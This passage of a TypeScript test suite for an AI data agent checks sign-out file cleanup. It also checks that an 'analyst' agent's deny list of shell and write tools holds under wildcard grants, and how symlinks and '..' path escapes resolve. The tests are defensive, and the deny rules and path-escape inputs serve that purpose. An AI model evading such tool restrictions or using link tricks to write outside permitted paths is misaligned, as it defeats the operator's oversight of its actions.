    await expect(AltimateApi.signOut(repo)).rejects.toThrow("could not read the saved key")
    expect(fs.existsSync(TelemetryIdentity.cachePath())).toBe(true)
  })

  test("only the identity file is removed, not its neighbours", async () => {
    await plantIdentity()
    const machineId = path.join(home, ".altimate", "machine-id")
    await fsp.writeFile(machineId, "123e4567-e89b-42d3-a456-426614174000")

    await AltimateApi.signOut(repo)

    expect(fs.existsSync(machineId)).toBe(true)
  })
})

// ---------------------------------------------------------------------------------------------------------
// 5. #1597 — analyst re-denies write tools after a wildcard grant; Filesystem.realLocation
// ---------------------------------------------------------------------------------------------------------

const it = testEffect(Agent.defaultLayer)
const action = (agent: Agent.Info, permission: string, pattern = "*") =>
  Permission.evaluate(permission, pattern, agent.permission).action
const ANALYST_REDENIED = [
  "bash",
  "sql_execute_write",
  "edit",
  "write",
  "apply_patch",
  "altimate_memory_write",
  "altimate_memory_delete",
  "training_import",
  "warehouse_add",
  "warehouse_remove",
  "warehouse_install_driver",
  "mcp_discover",
  "datamate_manager",
  "sample_setup",
  "feedback_submit",
  "data_diff",
  "batch",
]

for (const scope of ["global", "agent"] as const) {
  it.instance(
    `v0.12.9 adversarial: analyst keeps write tools denied under a ${scope} "*": "allow"`,
    () =>
      Effect.gen(function* () {
        const analyst = (yield* Agent.use.get("analyst"))!
        for (const tool of ANALYST_REDENIED) expect(action(analyst, tool), tool).toBe("deny")
        expect(action(analyst, "bash", "ls")).toBe("deny")
        expect(action(analyst, "edit", "models/a.sql")).toBe("deny")
        expect(action(analyst, "task", "general")).toBe("deny")
        expect(action(analyst, "task", "data-explorer")).toBe("allow")
        expect(action(analyst, "sql_execute")).toBe("allow")
      }),
    {
      config:
        scope === "global"
          ? { permission: { "*": "allow", bash: "allow", edit: "allow", task: "allow" } }
          : { agent: { analyst: { permission: { "*": "allow", bash: "allow", edit: "allow", task: "allow" } } } },
    },
  )
}

describe.skipIf(process.platform === "win32")("v0.12.9 adversarial: Filesystem.realLocation", () => {
  let root: string

  beforeEach(() => {
    root = fs.realpathSync(fs.mkdtempSync(path.join(tmpRoot, "real-")))
    fs.mkdirSync(path.join(root, "a", "b"), { recursive: true })
  })

  afterEach(() => fs.rmSync(root, { recursive: true, force: true }))

  test("relative and empty paths are undefined", () => {
    expect(Filesystem.realLocation("a/b")).toBeUndefined()
    expect(Filesystem.realLocation("")).toBeUndefined()
    expect(Filesystem.realLocation("../x")).toBeUndefined()
  })

  test("`link/..` steps out of where the link points, not lexically", () => {
    fs.symlinkSync(path.join(root, "a", "b"), path.join(root, "link"))
    expect(Filesystem.realLocation(`${root}/link/../x.txt`)).toBe(path.join(root, "a", "x.txt"))
    expect(Filesystem.realLocation(`${root}/link/../../y`)).toBe(path.join(root, "y"))
  })

  test("a dangling link resolves to where a write through it would land", () => {
    fs.symlinkSync(path.join(root, "a", "later.txt"), path.join(root, "dangling"))
    expect(Filesystem.realLocation(path.join(root, "dangling"))).toBe(path.join(root, "a", "later.txt"))
  })

  test("a relative dangling link containing `..` is followed from the link's directory", () => {
    fs.symlinkSync("../escape/target", path.join(root, "a", "rel"))
    expect(Filesystem.realLocation(path.join(root, "a", "rel"))).toBe(path.join(root, "escape", "target"))
  })

  test("a path whose parent does not exist keeps the missing segments as written", () => {
    expect(Filesystem.realLocation(path.join(root, "missing", "deeper", "f.sql"))).toBe(
      path.join(root, "missing", "deeper", "f.sql"),
    )
  })

  test("a link loop throws ELOOP", () => {
    fs.symlinkSync(path.join(root, "loop2"), path.join(root, "loop1"))
    fs.symlinkSync(path.join(root, "loop1"), path.join(root, "loop2"))
    let error: unknown
    try {
      Filesystem.realLocation(path.join(root, "loop1", "x"))
    } catch (e) {
      error = e
    }
    expect((error as NodeJS.ErrnoException)?.code).toBe("ELOOP")
  })

  test("a self-referencing link throws ELOOP rather than hanging", () => {
    fs.symlinkSync(path.join(root, "self"), path.join(root, "self"))
    expect(() => Filesystem.realLocation(path.join(root, "self"))).toThrow(/Too many symbolic links/)
  })

  test("repeated slashes and `.` segments are ignored", () => {
    expect(Filesystem.realLocation(`${root}//a/./b//`)).toBe(path.join(root, "a", "b"))
  })

  test("`..` above the root stays at the root", () => {
    expect(Filesystem.realLocation("/../../..")).toBe("/")
  })
})
